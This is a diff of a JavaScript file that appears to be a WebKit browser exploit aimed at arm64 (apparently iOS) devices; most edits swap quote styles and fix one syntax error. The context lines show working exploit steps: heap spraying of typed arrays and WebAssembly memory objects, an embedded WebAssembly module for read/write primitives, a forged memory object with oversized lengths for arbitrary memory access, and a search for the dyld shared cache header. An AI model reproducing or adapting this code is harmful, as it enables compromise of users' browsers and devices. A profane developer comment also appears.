@@ -715,20 +715,20 @@ b.process = (inputs, outputs, parameters)=>{
         var structs = [];
         for (var i = 0; i < 0x5000; i++) {
             var a = new Float64Array(1);
-            a['prop' + i] = 1337;
+            a["prop" + i] = 1337;
             structs.push(a);
         }
         
         print1('[*] Spraying structures to get a butterfly (2/2)...');
         for (var i = 0; i < 500; i++) {
             var a = new WebAssembly.Memory({inital: 0});
-            a['prop' + i] = 1339;
+            a["prop" + i] = 1339;
             structs.push(a);
         }
         
         print1("[*] Preparing R/W primitives...");
         
-        var webAssemblyCode = '\x00asm\x01\x00\x00\x00\x01\x0b\x02`\x01\x7f\x01\x7f`\x02\x7f\x7f\x00\x02\x10\x01\x07imports\x03mem\x02\x00\x02\x03\x07\x06\x00\x01\x00\x01\x00\x01\x07D\x06\x08read_i32\x00\x00\twrite_i32\x00\x01\x08read_i16\x00\x02\twrite_i16\x00\x03\x07read_i8\x00\x04\x08write_i8\x00\x05\nF\x06\x0b\x00 \x00A\x04l(\x02\x00\x0f\x0b\x0c\x00 \x00A\x04l \x016\x02\x00\x0b\x0b\x00 \x00A\x02l/\x01\x00\x0f\x0b\x0c\x00 \x00A\x02l \x01;\x01\x00\x0b\x08\x00 \x00-\x00\x00\x0f\x0b\t\x00 \x00 \x01:\x00\x00\x0b';
+        var webAssemblyCode ="\x00asm\x01\x00\x00\x00\x01\x0b\x02`\x01\x7f\x01\x7f`\x02\x7f\x7f\x00\x02\x10\x01\x07imports\x03mem\x02\x00\x02\x03\x07\x06\x00\x01\x00\x01\x00\x01\x07D\x06\x08read_i32\x00\x00\twrite_i32\x00\x01\x08read_i16\x00\x02\twrite_i16\x00\x03\x07read_i8\x00\x04\x08write_i8\x00\x05\nF\x06\x0b\x00 \x00A\x04l(\x02\x00\x0f\x0b\x0c\x00 \x00A\x04l \x016\x02\x00\x0b\x0b\x00 \x00A\x02l/\x01\x00\x0f\x0b\x0c\x00 \x00A\x02l \x01;\x01\x00\x0b\x08\x00 \x00-\x00\x00\x0f\x0b\t\x00 \x00 \x01:\x00\x00\x0b";
         var webAssemblyBuffer = str2ab(webAssemblyCode);
         var webAssemblyModule = new WebAssembly.Module(webAssemblyBuffer);
         
@@ -751,9 +751,9 @@ b.process = (inputs, outputs, parameters)=>{
         var wasmInternalMemory = {
             jsCellHeader: null,
             memoryToRead: {}, 
-            sizeToRead: (new Int64('0x0FFFFFFFFFFFFFFF')).asJSValue(), 
-            size: (new Int64('0x0FFFFFFFFFFFFFFF')).asJSValue(), 
-            initialSize: (new Int64('0x0FFFFFFFFFFFFFFF')).asJSValue(), 
+            sizeToRead: (new Int64("0x0FFFFFFFFFFFFFFF")).asJSValue(), 
+            size: (new Int64("0x0FFFFFFFFFFFFFFF")).asJSValue(), 
+            initialSize: (new Int64("0x0FFFFFFFFFFFFFFF")).asJSValue(), 
             junk1: null,
             junk2: null,
             junk3: null,
@@ -786,7 +786,7 @@ b.process = (inputs, outputs, parameters)=>{
         var maxtry = 0;
         
         if (fakeWasmBuffer instanceof WebAssembly.Memory) {
-            print1('gotcha!');
+            print1("gotcha!");
             //continue;
         } else {
             while (!(fakeWasmBuffer instanceof WebAssembly.Memory)) {
@@ -1024,7 +1024,7 @@ b.process = (inputs, outputs, parameters)=>{
         while(true)
         {
         /*FUCK THIS TEAM!!! Whole time header is just the Webcore header not the fucking shared cache header!!!! A whole year of struggling to get this update to work just to find out it's fucking wrong...*/
-        if(strcmp(memory.read(hdr, 0x10), "dyld_v1   arm64"))) //cache header magic
+        if(strcmp(memory.read(hdr, 0x10), "dyld_v1   arm64")) //cache header magic
         //webcore header magic...
         {
             print1(String.fromCharCode(...memory.read(hdr, 0x10)))
